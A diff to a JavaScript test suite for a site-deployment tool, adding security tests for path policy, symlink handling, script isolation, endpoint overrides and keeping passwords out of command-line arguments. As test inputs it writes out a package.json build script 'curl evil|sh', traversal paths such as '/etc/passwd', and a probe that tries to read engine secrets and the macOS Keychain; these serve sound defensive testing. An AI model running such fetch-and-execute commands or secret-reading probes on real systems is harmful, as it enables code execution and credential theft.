@@ -24,8 +24,15 @@ const ENV = {
   BID_LAST_AI_REQ: path.join(TMP, 'last-ai-request.json'),
   BID_NO_BUNDLED_CLOUD: '1', // never talk to the real Supabase in tests
   BID_LANG: 'en', // assertions check message keys; texts come from engine/i18n/en.json
+  BID_TEST_ENDPOINTS: '1', // endpoint overrides (mock Anthropic, Spaceship …) are honoured only with this switch
 };
 fs.mkdirSync(ENV.HOME, { recursive: true });
+// the engine uses an installed Netlify CLI only (no `npx netlify-cli`); a stub stands in until the release
+// tests replace it with the full fake below
+const FAKE_BIN = path.join(TMP, 'bin');
+fs.mkdirSync(FAKE_BIN, { recursive: true });
+fs.writeFileSync(path.join(FAKE_BIN, 'netlify'), '#!/bin/sh\necho "fake netlify stub: $*" >&2\nexit 1\n', { mode: 0o755 });
+ENV.PATH = `${FAKE_BIN}${path.delimiter}${ENV.PATH}`;
 
 let passed = 0;
 let failed = 0;
@@ -735,6 +742,158 @@ t('сигурност: публикуване от корена на проек�
   assert(hostingMod.stagePublicCopy(dir, 'dist') === 'dist', 'a build folder is published as it is');
 });
 
+// ---- WP01: files, scripts, secrets and publishing
+const policyMod = await import(path.join(ROOT, 'engine', 'src', 'pathpolicy.mjs'));
+const promptsMod = await import(path.join(ROOT, 'engine', 'src', 'ai', 'prompts.mjs'));
+const runModule = (script, extra = {}) => spawnSync(process.execPath, ['--input-type=module', '-e', script], { env: { ...ENV, ...extra }, encoding: 'utf8', cwd: ROOT });
+
+t('WP01 пътища: класове, `..`, symlink по пътя, O_NOFOLLOW, конфигурации искат отделно одобрение', () => {
+  const dir = mk('wp01-paths', { 'src/app.js': 'x', 'package.json': '{"scripts":{}}', '.env': 'K=1', '.env.example': 'K=', 'outside-target.txt': 'keep' });
+  const C = (p) => policyMod.classify(p);
+  assert(C('.env') === 'secret' && C('.env.production') === 'secret' && C('certs/site.pem') === 'secret' && C('id_ed25519') === 'secret', 'secrets');
+  assert(C('.env.example') === 'source' && C('src/app.js') === 'source', 'sources');
+  assert(C('package.json') === 'config' && C('vite.config.ts') === 'config' && C('netlify.toml') === 'config' && C('tsconfig.app.json') === 'config' && C('yarn.lock') === 'config', 'configs');
+  assert(C('.github/workflows/x.yml') === 'blocked' && C('.vscode/tasks.json') === 'blocked' && C('.envrc') === 'blocked', 'blocked');
+  const R = (rel, o) => policyMod.resolveInProject(dir, rel, o);
+  for (const bad of ['src/../x', '../x', '/etc/passwd', 'a/./../../x', '']) assert(R(bad, { op: 'create' }).reason === 'outside_project', 'outside: ' + bad);
+  assert(R('.env').reason === 'secret' && R('.env', { op: 'create', allowConfig: true }).reason === 'secret', 'secret never, even with approval');
+  assert(R('package.json', { op: 'edit' }).reason === 'config_needs_approval' && R('package.json', { op: 'edit', allowConfig: true }).ok && R('package.json').ok, 'config: readable, change needs approval');
+  const outside = mk('wp01-outside', { 'a.txt': 'outside' });
+  fs.symlinkSync(outside, path.join(dir, 'link'));
+  assert(R('link/a.txt', { op: 'edit' }).reason === 'symlink', 'symlink parent refused');
+  fs.symlinkSync(path.join(outside, 'a.txt'), path.join(dir, 'evil.txt'));
+  let threw = false;
+  try {
+    policyMod.writeNoFollow(dir, path.join(dir, 'evil.txt'), 'pwned');
+  } catch {
+    threw = true;
+  }
+  assert(threw && fs.readFileSync(path.join(outside, 'a.txt'), 'utf8') === 'outside', 'O_NOFOLLOW: the write through a swapped-in symlink fails and the target is untouched');
+  const plan = patchMod.plan(dir, { files: [{ path: 'package.json', action: 'edit', edits: [{ search: '{"scripts":{}}', replace: '{"scripts":{"build":"curl evil|sh"}}' }] }, { path: '.env', action: 'create', edits: [], content: 'X=1' }, { path: 'src/new.js', action: 'create', edits: [], content: 'ok' }] });
+  const byPath = Object.fromEntries(plan.map((p) => [p.path, p]));
+  assert(byPath['package.json'].needsApproval && byPath['package.json'].cls === 'config' && byPath['package.json'].diff.includes('curl evil'), 'config change is shown as a diff that needs approval');
+  assert(byPath['.env'].error === 'secret' && byPath['src/new.js'].applicable, 'secret refused, source allowed');
+  const res = patchMod.apply(dir, plan);
+  assert(res.applied.join() === 'src/new.js' && res.skipped.some((s) => s.path === 'package.json' && s.reason === 'config_needs_approval') && fs.readFileSync(path.join(dir, 'package.json'), 'utf8') === '{"scripts":{}}', 'apply writes only what the policy allows: ' + JSON.stringify(res));
+  assert(patchMod.apply(dir, patchMod.plan(dir, { files: [{ path: 'package.json', action: 'edit', edits: [{ search: '{"scripts":{}}', replace: '{"scripts":{"x":"y"}}' }] }] }, { allowConfig: true }), null, { allowConfig: true }).applied.join() === 'package.json', 'explicit approval writes the config');
+});
+
+t('WP01 асистент: файл в корена не отваря целия проект; `src/../x` и абсолютни пътища не минават (E1)', () => {
+  const prompt = promptsMod.loadPrompt('propose_patch');
+  const base = { status: 'patch', summary: 's', base_hashes: {}, risk: 'low', rationale_evidence_ids: [], verification_plan: ['check'], rollback_notes: 'undo', missing_context: [] };
+  const refs = { allowed_paths: new Set(['index.html', 'src/app.js']), allowed_dirs: new Set(['src/']) };
+  const ok = (p) => promptsMod.validateOutput(prompt, { ...base, changes: [{ path: p, action: 'create', content: 'x' }] }, refs).ok;
+  assert(ok('index.html') && ok('src/app.js') && ok('src/new.js'), 'allowed file and a new file next to a snapshotted one');
+  for (const bad of ['netlify.toml', 'vite.config.js', 'src/../netlify.toml', '/etc/x', './index.html', 'other/x.js']) assert(!ok(bad), 'must refuse ' + bad);
+  // the empty prefix a root file used to add must not help either
+  assert(!promptsMod.validateOutput(prompt, { ...base, changes: [{ path: 'netlify.toml', action: 'create', content: 'x' }] }, { ...refs, allowed_dirs: new Set(['', 'src/']) }).ok, 'an empty allowed dir is ignored');
+});
+
+t('WP01 undo: подправен запис не пише извън проекта и не минава през symlink (E5)', () => {
+  const dir = mk('wp01-undo', { 'index.html': HTML });
+  bid('project', 'add', '--path', dir);
+  const key = bid('status', '--project', dir).data.project.key;
+  const outside = mk('wp01-undo-outside', { 'x.txt': 'keep' });
+  fs.symlinkSync(outside, path.join(dir, 'lnk'));
+  const rec = path.join(ENV.BID_APP_DIR, 'undo', 'forged.json');
+  fs.mkdirSync(path.dirname(rec), { recursive: true });
+  fs.writeFileSync(rec, JSON.stringify({ project: key, files: [{ path: '../wp01-undo-outside/x.txt', before: 'pwned', after: 'keep' }, { path: 'lnk/x.txt', before: 'pwned', after: 'keep' }] }));
+  const sf = path.join(ENV.BID_APP_DIR, 'state', `${key}.json`);
+  fs.mkdirSync(path.dirname(sf), { recursive: true });
+  const st = fs.existsSync(sf) ? JSON.parse(fs.readFileSync(sf, 'utf8')) : {};
+  fs.writeFileSync(sf, JSON.stringify({ ...st, aiUndo: { file: rec, at: new Date().toISOString(), applied: [] } }));
+  const u = bid('ai', 'undo', '--project', dir, '--yes');
+  assert(u.data.restored.length === 0 && u.data.skipped.some((s) => s.reason === 'outside_project') && u.data.skipped.some((s) => s.reason === 'symlink'), JSON.stringify(u.result));
+  assert(fs.readFileSync(path.join(outside, 'x.txt'), 'utf8') === 'keep', 'the outside file is untouched');
+});
+
+t('WP01 скриптове: build не вижда тайните на engine-а; --auto не пуска променени скриптове; изолация на macOS', () => {
+  const probe = `const fs=require('fs');fs.appendFileSync('runs.txt','run\\n');const out={env:process.env};try{fs.readFileSync(process.argv[1]+'/projects.json');out.appDir='readable'}catch(e){out.appDir=e.code}try{out.keychain=require('child_process').execFileSync('security',['find-generic-password','-s','BeforeIDeploy-wp01-probe','-w'],{encoding:'utf8',stdio:['ignore','pipe','pipe']}).trim()}catch(e){out.keychain='denied:'+(e.status??e.code)}fs.writeFileSync('probe.json',JSON.stringify(out));fs.mkdirSync('dist',{recursive:true});fs.writeFileSync('dist/index.html','<html lang=en><title>t</title><meta name=description content=d>ok</html>')`;
+  fs.writeFileSync(path.join(TMP, 'wp01-probe.cjs'), probe);
+  const dir = mk('wp01-scripts', { 'package.json': JSON.stringify({ name: 'p', scripts: { build: `node ${JSON.stringify(path.join(TMP, 'wp01-probe.cjs'))} ${JSON.stringify(ENV.BID_APP_DIR)}` } }), 'node_modules/.keep': '' });
+  const mac = process.platform === 'darwin' && !!process.env.CI;
+  if (mac) spawnSync('security', ['add-generic-password', '-U', '-s', 'BeforeIDeploy-wp01-probe', '-a', 'probe', '-w', 'probe-secret-value'], { encoding: 'utf8' });
+  try {
+    const leaky = { BID_PASSWORD: 'engine-pass', BID_AI_KEY: 'sk-ant-engine', NETLIFY_AUTH_TOKEN: 'nf-token', NODE_OPTIONS: '--max-old-space-size=4096', npm_config__authToken: 'npm-token', BID_PUSHOVER_TOKEN: 'po' };
+    const r = bidEnv(leaky, 'check', '--project', dir);
+    const build = r.data.steps.find((s) => s.id === 'build');
+    assert(build.status === 'pass', 'the build still works: ' + JSON.stringify(build));
+    const out = JSON.parse(fs.readFileSync(path.join(dir, 'probe.json'), 'utf8'));
+    for (const k of Object.keys(leaky)) assert(out.env[k] === undefined, k + ' must not reach project scripts');
+    assert(out.env.CI === '1' && out.env.PATH && out.env.HOME, 'the allowlisted basics are there');
+    assert(r.data.isolation === (process.platform === 'darwin' ? 'sandbox' : 'none'), 'isolation reported: ' + r.data.isolation);
+    if (mac) {
+      assert(out.appDir !== 'readable', 'the sandbox hides the engine folder: ' + out.appDir);
+      assert(!String(out.keychain).includes('probe-secret-value'), 'the sandbox blocks the Keychain: ' + out.keychain);
+    }
+    const runs = () => fs.readFileSync(path.join(dir, 'runs.txt'), 'utf8').trim().split('\n').length;
+    const before = runs();
+    const again = bid('check', '--project', dir, '--auto', '--force');
+    assert(again.result.ok && runs() === before + 1, 'unchanged scripts: the automatic check runs');
+    const pkg = JSON.parse(fs.readFileSync(path.join(dir, 'package.json'), 'utf8'));
+    pkg.scripts.build += ' # changed';
+    fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify(pkg));
+    const refused = bid('check', '--project', dir, '--auto', '--force');
+    assert(refused.result.code === 'scripts_changed' && refused.result.params.files.includes('package.json') && runs() === before + 1, 'changed scripts: nothing ran: ' + JSON.stringify(refused.result));
+    fs.writeFileSync(path.join(dir, 'vite.config.js'), 'export default {}');
+    assert(bid('check', '--project', dir, '--auto').result.code === 'scripts_changed', 'a new executable config counts too');
+    assert(bid('check', '--project', dir, '--force').result.ok && runs() === before + 2, 'a check the user starts runs and approves');
+    assert(bid('check', '--project', dir, '--auto', '--force').result.ok && runs() === before + 3, 'after approval the automatic check runs again');
+  } finally {
+    if (mac) spawnSync('security', ['delete-generic-password', '-s', 'BeforeIDeploy-wp01-probe'], { encoding: 'utf8' });
+  }
+});
+
+t('WP01 публикуване: staged копие = проверения манифест; различие → нищо не се качва; отделни папки за паралелни задачи', () => {
+  const a = mk('wp01-stage/site', { 'index.html': HTML, '.env': 'SECRET=1', 'package.json': '{}', 'img/a.svg': '<svg/>' });
+  const b = mk('wp01-stage2/site', { 'index.html': HTML + '<!-- b -->' });
+  const script = `
+import fs from 'node:fs';
+const { stageArtifact } = await import(${JSON.stringify(path.join(ROOT, 'engine', 'src', 'staging.mjs'))});
+const { artifactHash } = await import(${JSON.stringify(path.join(ROOT, 'engine', 'src', 'checks.mjs'))});
+const pa = { key: 'ka', path: ${JSON.stringify(a)} }, pb = { key: 'kb', path: ${JSON.stringify(b)} };
+const want = (await artifactHash(pa.path, '.')).hash;
+const [sa, sb] = await Promise.all([stageArtifact(pa, '.', { expected: want }), stageArtifact(pb, '.')]);
+const out = { same: sa.hash === want, apart: sa.dir !== sb.dir, env: fs.existsSync(sa.dir + '/.env'), pkg: fs.existsSync(sa.dir + '/package.json'), img: fs.existsSync(sa.dir + '/img/a.svg') };
+fs.appendFileSync(sa.dir + '/index.html', 'tampered');
+try { await sa.verify(); out.verify = 'passed'; } catch (e) { out.verify = e.code + ':' + e.failure; }
+out.cleaned = !fs.existsSync(sa.dir);
+sb.cleanup();
+try { await stageArtifact(pa, '.', { expected: 'f'.repeat(64) }); out.mismatch = 'uploaded'; } catch (e) { out.mismatch = e.code + ':' + e.failure; }
+console.log(JSON.stringify(out));`;
+  const r = runModule(script);
+  assert(r.status === 0, r.stderr);
+  const o = JSON.parse(r.stdout.trim().split('\n').pop());
+  assert(o.same && o.apart && !o.env && !o.pkg && o.img, 'staged copy: filtered, hashed like the check, one folder per job: ' + r.stdout);
+  assert(o.verify === 'stale_release:artifact_changed' && o.cleaned, 'a copy touched during the upload fails and is removed: ' + r.stdout);
+  assert(o.mismatch === 'stale_check:artifact_changed', 'a copy that differs from the verified manifest is never uploaded: ' + r.stdout);
+});
+
+t('WP01 endpoints: override-ите важат само в тестовия режим и никога в bundle-а на приложението (E4)', () => {
+  const off = bidEnv({ BID_TEST_ENDPOINTS: '0', BID_ANTHROPIC_API: 'http://evil.example', BID_SPACESHIP_BASE: 'http://evil.example' }, 'doctor');
+  assert(off.data.endpoints.anthropic === 'https://api.anthropic.com' && off.data.endpoints.spaceship === 'https://spaceship.dev/api/v1' && off.data.endpoints.overrides === false, JSON.stringify(off.data.endpoints));
+  const on = bidEnv({ BID_ANTHROPIC_API: 'http://127.0.0.1:1' }, 'doctor');
+  assert(on.data.endpoints.anthropic === 'http://127.0.0.1:1' && on.data.production === false, 'test switch on in the repository');
+  const marker = path.join(ROOT, 'engine', '.production');
+  fs.writeFileSync(marker, '');
+  try {
+    const prod = bidEnv({ BID_ANTHROPIC_API: 'http://127.0.0.1:1', BID_TEST_ALLOW_PRIVATE_WEBHOOK: '1' }, 'doctor');
+    assert(prod.data.production === true && prod.data.endpoints.anthropic === 'https://api.anthropic.com' && prod.data.endpoints.overrides === false, 'the bundled engine ignores every override: ' + JSON.stringify(prod.data.endpoints));
+    assert(bid('cloud', 'config', '--url', 'http://127.0.0.1:9', '--anon-key', 'x').result.code === 'usage', 'a local cloud is refused in the bundle');
+  } finally {
+    fs.rmSync(marker, { force: true });
+  }
+  const r = runModule(`const { cloudConfig } = await import(${JSON.stringify(path.join(ROOT, 'engine', 'src', 'account.mjs'))}); console.log(JSON.stringify(cloudConfig()));`, { BID_TEST_ENDPOINTS: '0', BID_SUPABASE_URL: 'https://evil.example.com', BID_SUPABASE_ANON_KEY: 'k' });
+  assert(!r.stdout.includes('evil.example.com'), 'a non-Supabase URL from the environment is ignored: ' + r.stdout + r.stderr);
+});
+
+t('WP01 argv: пароли, токени и ключове не се приемат като флагове (E9)', () => {
+  for (const [args, env] of [[['account', 'login', '--email', 'a@b.co', '--password', 'p4ss-in-argv'], 'BID_PASSWORD'], [['account', 'session', '--access', 'a', '--refresh', 'r'], 'BID_ACCESS'], [['spaceship', 'connect', '--key', 'k', '--secret', 's'], 'BID_SPACESHIP_KEY'], [['monitor', 'pushover', 'connect', '--token', 't'], 'BID_PUSHOVER_TOKEN']]) {
+    const r = bid(...args);
+    assert(r.result.code === 'secret_in_argv' && r.result.params.env === env, args.join(' ') + ' → ' + JSON.stringify(r.result));
+  }
+});
+
 t('сигурност: macOS Keychain — тайната минава през stdin и се чете обратно непроменена (само на Mac в CI)', () => {
   if (process.platform !== 'darwin' || !process.env.CI) return;
   const script = `import { setSecret, getSecret, deleteSecret } from ${JSON.stringify(path.join(ROOT, 'engine', 'src', 'secrets.mjs'))};
@@ -989,22 +1148,22 @@ t('акаунт: регистрация, вход, грешна парола, sy
   try {
     const c = bid('cloud', 'config', '--url', `http://127.0.0.1:${sbPort}`, '--anon-key', 'ANON');
     assert(c.result.ok, c.result?.error);
-    const s = bid('account', 'signup', '--email', 'yavor@example.com', '--password', 'supersecret1', '--name', 'Yavor');
+    const s = bidEnv({ BID_PASSWORD: 'supersecret1' }, 'account', 'signup', '--email', 'yavor@example.com', '--name', 'Yavor');
     assert(s.data.loggedIn && s.data.email === 'yavor@example.com', JSON.stringify(s.data));
-    const dup = bid('account', 'signup', '--email', 'yavor@example.com', '--password', 'supersecret1');
+    const dup = bidEnv({ BID_PASSWORD: 'supersecret1' }, 'account', 'signup', '--email', 'yavor@example.com');
     assert(dup.result.key === 'account.auth.alreadyRegistered', JSON.stringify(dup.result));
-    const weak = bid('account', 'signup', '--email', 'x@example.com', '--password', '123');
+    const weak = bidEnv({ BID_PASSWORD: '123' }, 'account', 'signup', '--email', 'x@example.com');
     assert(weak.result.code === 'weak_password' && weak.result.key === 'account.weakPassword', weak.result.code);
     bid('account', 'logout');
     assert(bid('account', 'status').data.loggedIn === false, 'still logged in');
     const anon = bid('account', 'status');
     assert(JSON.stringify(anon.data.providers) === '["github"]', 'providers from /auth/v1/settings: ' + JSON.stringify(anon.data));
     fixture('account-status-anon', anon.data);
-    const bad = bid('account', 'login', '--email', 'yavor@example.com', '--password', 'wrong-pass');
+    const bad = bidEnv({ BID_PASSWORD: 'wrong-pass' }, 'account', 'login', '--email', 'yavor@example.com');
     assert(bad.result.key === 'account.auth.invalidCredentials', JSON.stringify(bad.result));
-    const badBg = bidEnv({ BID_LANG: 'bg' }, 'account', 'login', '--email', 'yavor@example.com', '--password', 'wrong-pass');
+    const badBg = bidEnv({ BID_LANG: 'bg', BID_PASSWORD: 'wrong-pass' }, 'account', 'login', '--email', 'yavor@example.com');
     assert(badBg.result.error === 'Грешен имейл или парола.', badBg.result.error);
-    const good = bid('account', 'login', '--email', 'yavor@example.com', '--password', 'supersecret1');
+    const good = bidEnv({ BID_PASSWORD: 'supersecret1' }, 'account', 'login', '--email', 'yavor@example.com');
     assert(good.data.loggedIn, 'login');
     fixture('account-status', good.data);
     assert(good.data.role === 'admin' && good.data.plan === 'free' && good.data.locale === 'en', JSON.stringify(good.data));
@@ -1036,7 +1195,7 @@ t('акаунт: регистрация, вход, грешна парола, sy
     fixture('admin-users', users.data);
     assert(users.result.ok && users.data.users.length === 1, JSON.stringify(users.result));
     bid('account', 'logout');
-    const friend = bid('account', 'signup', '--email', 'friend@example.com', '--password', 'supersecret2', '--name', 'Friend');
+    const friend = bidEnv({ BID_PASSWORD: 'supersecret2' }, 'account', 'signup', '--email', 'friend@example.com', '--name', 'Friend');
     assert(friend.data.role === 'normal' && friend.data.features['admin.panel'] === false && friend.data.features['cloud.sync'] === false && friend.data.features['ai.ownKey'] === false, JSON.stringify(friend.data));
     assert(friend.data.features['projects.max'] === 2, 'free plan limit');
     const skipped = bid('account', 'sync');
@@ -1044,7 +1203,7 @@ t('акаунт: регистрация, вход, грешна парола, sy
     const refused = bid('admin', 'list_users');
     assert(refused.result.code === 'forbidden' && refused.result.key === 'admin.forbidden', JSON.stringify(refused.result));
     bid('account', 'logout');
-    bid('account', 'login', '--email', 'yavor@example.com', '--password', 'supersecret1');
+    bidEnv({ BID_PASSWORD: 'supersecret1' }, 'account', 'login', '--email', 'yavor@example.com');
     const vip = bid('admin', 'set_role', '--user', 'u-friend@example.com', '--role', 'vip');
     assert(vip.result.ok && vip.data.user.role === 'vip', JSON.stringify(vip.result));
     const grant = bid('admin', 'grant_credits', '--user', 'u-friend@example.com', '--delta', '250000', '--reason', 'test');
@@ -1052,11 +1211,11 @@ t('акаунт: регистрация, вход, грешна парола, sy
     const log = bid('admin', 'audit_log');
     assert(log.data.entries.some((e) => e.action === 'set_role'), 'audit');
     bid('account', 'logout');
-    const friend2 = bid('account', 'login', '--email', 'friend@example.com', '--password', 'supersecret2');
+    const friend2 = bidEnv({ BID_PASSWORD: 'supersecret2' }, 'account', 'login', '--email', 'friend@example.com');
     assert(friend2.data.role === 'vip' && friend2.data.credits.balance === 250000 && friend2.data.features['ai.ownKey'] === true && friend2.data.features['cloud.sync'] === true, JSON.stringify(friend2.data));
     assert(bid('account', 'sync').data.synced >= 3, 'vip syncs');
     bid('account', 'logout');
-    bid('account', 'login', '--email', 'yavor@example.com', '--password', 'supersecret1');
+    bidEnv({ BID_PASSWORD: 'supersecret1' }, 'account', 'login', '--email', 'yavor@example.com');
   } finally {
     // the mock stays up for the AI tests below; it is killed at exit
   }
@@ -1079,7 +1238,7 @@ t('cloud doctor: схема, функции, вход при непълен об
   fs.writeFileSync(FAKE_NETLIFY + '.noschema', '1');
   try {
     bid('account', 'logout');
-    const r = bid('account', 'login', '--email', 'yavor@example.com', '--password', 'supersecret1');
+    const r = bidEnv({ BID_PASSWORD: 'supersecret1' }, 'account', 'login', '--email', 'yavor@example.com');
     assert(r.result.ok && r.data.loggedIn === true && r.data.schemaMissing === true && r.data.plan === 'free', JSON.stringify(r.result).slice(0, 300));
     const d2 = bid('cloud', 'doctor');
     assert(d2.data.schemaApplied === false && d2.data.tablesMissing.join() === 'profiles', JSON.stringify(d2.data.tables));
@@ -1130,14 +1289,13 @@ const aiFixture = { 'package.json': JSON.stringify({ name: 'ai-app', scripts: { 
 const aiApp = mk('ai-app', aiFixture);
 
 // ---- Releases (V11): fake Netlify CLI on PATH + the sandbox server serves the "deployed" files
-const FAKE_BIN = path.join(TMP, 'bin');
-fs.mkdirSync(FAKE_BIN, { recursive: true });
 fs.writeFileSync(path.join(FAKE_BIN, 'netlify'), `#!/usr/bin/env node
 const fs=require('fs'),path=require('path');const STATE=process.env.FAKE_NETLIFY_STATE;const PORT=process.env.FAKE_NETLIFY_PORT;const live='http://127.0.0.1:'+PORT+'/';
 const load=()=>{try{return JSON.parse(fs.readFileSync(STATE,'utf8'));}catch{return {deploys:{},published:null,n:0};}};const save=(s)=>fs.writeFileSync(STATE,JSON.stringify(s));
 const a=process.argv.slice(2);const out=(o)=>process.stdout.write(JSON.stringify(o)+'\\n');
-if(a[0]==='deploy'){const s=load();s.n++;const id='dep-'+s.n;const di=a.indexOf('--dir');const dir=di>-1?path.resolve(a[di+1]):process.cwd();const prod=a.includes('--prod');if(s.mutateOnDeploy){fs.appendFileSync(path.join(dir,s.mutateOnDeploy),'<!-- changed mid-upload -->');}
- s.deploys[id]={id,dir,state:'ready',context:prod?'production':'deploy-preview',created_at:new Date(Date.now()+s.n).toISOString(),deploy_ssl_url:'http://127.0.0.1:'+PORT+'/deploys/'+id+'/'};
+if(a[0]==='deploy'){const s=load();s.n++;const id='dep-'+s.n;const di=a.indexOf('--dir');const src=di>-1?path.resolve(a[di+1]):process.cwd();const prod=a.includes('--prod');if(s.mutateOnDeploy){fs.appendFileSync(path.join(src,s.mutateOnDeploy),'<!-- changed mid-upload -->');}
+ const dir=path.join(path.dirname(STATE),'netlify-uploads',id);fs.cpSync(src,dir,{recursive:true});
+ s.deploys[id]={id,dir,src,state:'ready',context:prod?'production':'deploy-preview',created_at:new Date(Date.now()+s.n).toISOString(),deploy_ssl_url:'http://127.0.0.1:'+PORT+'/deploys/'+id+'/'};
  if(prod){s.published=id;s.deploys[id].published_at=new Date().toISOString();}save(s);out({deploy_id:id,deploy_url:s.deploys[id].deploy_ssl_url,url:live,site_name:'rel-site',logs:'http://logs/'+id});process.exit(0);}
 if(a[0]==='api'){const s=load();const data=JSON.parse(a[a.indexOf('--data')+1]||'{}');const m=a[1];
  if(m==='getSite'){out({id:data.site_id,name:'rel-site',ssl_url:live,url:live,published_deploy:s.published?{id:s.published,published_at:s.deploys[s.published].published_at}:null});process.exit(0);}
@@ -1377,7 +1535,7 @@ t('ai: собствен ключ → patch, прилагане само с --yes
   const guest = bid('account', 'status');
   assert(guest.data.loggedIn === false && guest.data.features['ai.builtin'] === false, JSON.stringify(guest.data.features));
   assert(['not_logged_in', 'ai_unavailable'].includes(bid('ai', 'explain', '--project', aiApp, '--step', 'build').result.code), 'guest AI must be refused');
-  bid('account', 'login', '--email', 'yavor@example.com', '--password', 'supersecret1');
+  bidEnv({ BID_PASSWORD: 'supersecret1' }, 'account', 'login', '--email', 'yavor@example.com');
   bid('account', 'keys', 'delete', '--provider', 'anthropic');
 });
 
@@ -1556,7 +1714,7 @@ t('ai: cloud път — план, кредити, quota_exhausted → exit 8, fr
   assert(bid('check', '--project', cloudApp).data.status === 'blocked', 'fixture');
   bid('admin', 'set_role', '--user', 'u-friend@example.com', '--role', 'normal');
   bid('admin', 'set_plan_manual', '--user', 'u-friend@example.com', '--plan', 'high');
-  const login = (email, pw) => { bid('account', 'logout'); return bid('account', 'login', '--email', email, '--password', pw); };
+  const login = (email, pw) => { bid('account', 'logout'); return bidEnv({ BID_PASSWORD: pw }, 'account', 'login', '--email', email); };
   const f = login('friend@example.com', 'supersecret2');
   assert(f.data.features['ai.cloud'] === true && f.data.credits.balance === 250000, JSON.stringify(f.data));
   assert(f.data.credits.monthlyGrant === 250000 && f.data.credits.renewsAt === '2026-11-01T00:00:00Z', 'credits: ' + JSON.stringify(f.data.credits));
@@ -1582,7 +1740,7 @@ t('ai: cloud път — план, кредити, quota_exhausted → exit 8, fr
 });
 
 t('billing: каталог, статус, пробен период веднъж, checkout URL, неналичен план, портал', () => {
-  const login = (email, pw) => { bid('account', 'logout'); return bid('account', 'login', '--email', email, '--password', pw); };
+  const login = (email, pw) => { bid('account', 'logout'); return bidEnv({ BID_PASSWORD: pw }, 'account', 'login', '--email', email); };
   login('friend@example.com', 'supersecret2');
   const cat = bid('billing', 'catalog');
   assert(cat.result.ok && cat.data.plans.length === 3 && cat.data.currency === 'EUR' && cat.data.trial.days === 7, JSON.stringify(cat.result));
@@ -1662,6 +1820,7 @@ t('update: latest.json → налична версия, beta канал, изт�
 });
 
 t('logs & report: engine.log пази командите с маскирани пароли; докладът е без secrets', () => {
+  assert(bid('account', 'signup', '--email', 'argv@example.com', '--password', 'supersecret-argv').result.code === 'secret_in_argv', 'refused');
   const logs = bid('logs', '--tail', '400');
   assert(logs.data && logs.data.entries.length > 20 && logs.data.entries.every((e) => e.cmd && typeof e.ms === 'number'), 'entries: ' + JSON.stringify({ code: logs.code, result: logs.result, events: logs.events.length, stdoutBytes: (logs.stdout || '').length }) + (logs.stderr || '').slice(-300));
   const text = JSON.stringify(logs.data.entries);
@@ -1679,7 +1838,7 @@ t('logs & report: engine.log пази командите с маскирани �
 
 t('акаунт: експорт на данните и изтриване с --confirm DELETE', () => {
   bid('account', 'logout');
-  const gone = bid('account', 'signup', '--email', 'gone@example.com', '--password', 'supersecret3', '--name', 'Gone');
+  const gone = bidEnv({ BID_PASSWORD: 'supersecret3' }, 'account', 'signup', '--email', 'gone@example.com', '--name', 'Gone');
   assert(gone.data.loggedIn, JSON.stringify(gone.result));
   const exp = bid('account', 'export');
   assert(exp.result.ok && fs.existsSync(exp.data.path) && exp.data.path.startsWith(path.join(ENV.HOME, 'Downloads')), JSON.stringify(exp.result));
@@ -1690,9 +1849,9 @@ t('акаунт: експорт на данните и изтриване с --c
   const del = bid('account', 'delete', '--confirm', 'DELETE');
   assert(del.result.ok && del.data.deleted === true, JSON.stringify(del.result));
   assert(bid('account', 'status').data.loggedIn === false, 'session must be gone');
-  const again = bid('account', 'login', '--email', 'gone@example.com', '--password', 'supersecret3');
+  const again = bidEnv({ BID_PASSWORD: 'supersecret3' }, 'account', 'login', '--email', 'gone@example.com');
   assert(again.result.ok === false, 'the user must not exist any more');
-  bid('account', 'login', '--email', 'yavor@example.com', '--password', 'supersecret1');
+  bidEnv({ BID_PASSWORD: 'supersecret1' }, 'account', 'login', '--email', 'yavor@example.com');
 });
 
 t('хостинг: съветник — SSR изключва статичните хостинги', () => {
@@ -1791,7 +1950,7 @@ ta('local: сирак (сървър без state) се осиновява при
 
 ta('сигурност: Local Preview не дава .env/.git, отказва чужд Host, спира само с тайния ключ', async () => {
   const dir = mk('dotfile-site', { 'index.html': '<h1>ok</h1>', '.env': 'SECRET=1', '.git/config': '[core]', '.well-known/security.txt': 'contact' }, { repo: false });
-  const srv = spawnChild(process.execPath, [path.join(ROOT, 'engine', 'src', 'static-server.cjs'), dir, '4191', 'proj-key', 'secret-token'], { stdio: 'ignore', detached: true });
+  const srv = spawnChild(process.execPath, [path.join(ROOT, 'engine', 'src', 'static-server.cjs'), dir, '4191', 'proj-key'], { stdio: 'ignore', detached: true, env: { ...process.env, BID_STOP_TOKEN: 'secret-token' } });
   srv.unref();
   await new Promise((r) => setTimeout(r, 600));
   const req = (p, { method = 'GET', headers = {} } = {}) => new Promise((resolve) => {
